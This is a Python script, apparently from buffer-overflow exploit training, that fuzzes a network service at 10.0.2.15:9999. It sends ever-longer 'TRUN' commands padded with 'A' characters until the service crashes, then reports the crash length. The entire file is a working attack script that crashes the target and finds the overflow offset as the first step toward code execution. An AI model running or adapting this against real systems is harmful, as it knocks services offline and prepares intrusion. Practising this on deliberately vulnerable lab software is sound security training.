import socket
from time import sleep
import sys

numberOfCharacters = 100
stringToSend = "TRUN /.:/" + "A" * 100

while True:
    try:
        mySocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        mySocket.connect(("10.0.2.15",9999))
        bytes = stringToSend.encode(encoding = "latin1")
        mySocket.send(bytes)
        mySocket.close()

        stringToSend = stringToSend + "A" * numberOfCharacters

        sleep(1)

    except KeyboardInterrupt:
        print("crashed at: " + str(len(stringToSend)))
        sys.exit()
    except Exception as e:
        print("crashed at: " + str(len(stringToSend)))
        print(e)
        sys.exit()